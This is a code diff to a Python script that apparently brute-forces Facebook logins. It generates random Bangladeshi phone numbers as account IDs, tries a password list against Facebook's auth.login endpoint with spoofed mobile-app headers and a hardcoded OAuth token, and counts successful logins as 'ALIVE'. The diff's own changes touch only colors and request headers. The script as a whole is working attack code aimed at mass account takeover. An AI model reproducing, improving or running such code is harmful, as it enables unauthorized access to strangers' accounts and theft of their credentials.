@@ -212,7 +212,7 @@ def zahirul():
     print(f"{yellow}[{green}B{yellow}] {green}MAIN ADMIN FB ACCOUNT")
     print(f"{yellow}[{green}C{yellow}] {green}JOIN MESSENGER GROUP")
     print(f"{yellow}[{green}D{yellow}] {green}EXIT PROGRAMMING")
-    _____zahirul_____ = input(f'{white}[{green}+{white}] {green}SELECT : {yelloww}')
+    _____zahirul_____ = input(f'{yellow}[{green}+{yellow}] {green}SELECT : {yelloww}')
     if _____zahirul_____ in ['A','a','01','1']:
         os.system('xdg-open https://www.facebook.com/Zahirul65653?mibextid=JRoKGi')
         ___uids___()
@@ -229,12 +229,12 @@ def ___uids___():
     user=[]
     os.system('clear')
     logo()
-    print(f"{white}[{green}+{white}] BD SIM CODE {green}: 017 015 018 019 013 015 016")
+    print(f"{yellow}[{green}+{yellow}] BD SIM CODE {green}: 017 015 018 019 013 015 016")
     os.system('xdg-open https://www.facebook.com/Zahirul65653?mibextid=JRoKGi')
-    code = input(f"{white}[{green}+{white}] SELECT      {green}: {white}")
-    print(f"{white}[{green}+{white}] EXAMPLE {green}    : 1000,5000,10000,15000,20000")
+    code = input(f"{yellow}[{green}+{yellow}] SELECT      {green}: {white}")
+    print(f"{yellow}[{green}+{yellow}] EXAMPLE {green}    : 1000,5000,10000,15000,20000")
     os.system('xdg-open https://www.facebook.com/Zahirul65653?mibextid=JRoKGi')
-    limit = int(input(f"{white}[{green}+{white}] LIMIT       {green}: {white}"))
+    limit = int(input(f"{yellow}[{green}+{yellow}] LIMIT       {green}: {white}"))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
@@ -263,7 +263,7 @@ def ___uids___():
 def ___random___(ids,passlist):
     try:
         global oks,loop
-        sys.stdout.write(f'\r\r{rad}[{green}𝐒𝐂A𝐍𝐍𝐈𝐍𝐆{rad}]{white}<>{rad}[{yelloww}%s{rad}]{white}<>{rad}[{green}ALIVE:%s{rad}]'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{rad}[{green}𝐒𝐂A𝐍𝐍𝐈𝐍𝐆{rad}]{white}<>{rad}[{yelloww}%s{rad}]{white}<>{rad}[{green}ALIVE-MRX:%s{rad}]'%(loop,len(oks)));sys.stdout.flush()
         for pas in passlist:
             application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
             application_version_code = str(random.randint(000000000,999999999))
@@ -309,28 +309,19 @@ def ___random___(ids,passlist):
             "locale":"en_US","client_country_code":"US",
             'fb_api_req_friendly_name':'authenticate',
             "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
-            head ={
-            'Authorization':f'OAuth {accessToken}',
-            "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
-            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
-            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
-            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
-            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-            'X-FB-device-group': str(random.randint(2000, 4000)),
-            "X-FB-Friendly-Name": "ViewerReactionsMutation",
-            "X-FB-Request-Analytics-Tags": "graphservice",
-            'X-FB-Friendly-Name':'authenticate',
-            'X-FB-Connection-Type':'unknown',
-            'X-FB-connection-quality':'EXCELLENT',
-            "X-Tigon-Is-Retry": "False",
-            'User-Agent':___MSUA___,
-            "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
-            'Accept-Encoding':'gzip, deflate',
+            head={
+            'User-Agent': __UBI___(),
+            'Accept-Encoding':  'gzip, deflate',
+            'Accept': '*/*',
+            'Connection': 'keep-alive',
+            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'X-FB-Friendly-Name': 'authenticate',
+            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
+            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+            'X-FB-Connection-Type': 'MOBILE.LTE',
             'Content-Type': 'application/x-www-form-urlencoded',
-            "X-FB-Client-IP": "True",
-            "X-FB-Server-Cluster": "True",
-            'X-FB-HTTP-Engine': 'Liger'
-            }
+            'X-FB-HTTP-Engine': 'Liger'}
             url = 'https://b-api.facebook.com/method/auth.login'
             po = requests.post(url,data=data,headers=head,allow_redirects=False).text
             q = json.loads(po)
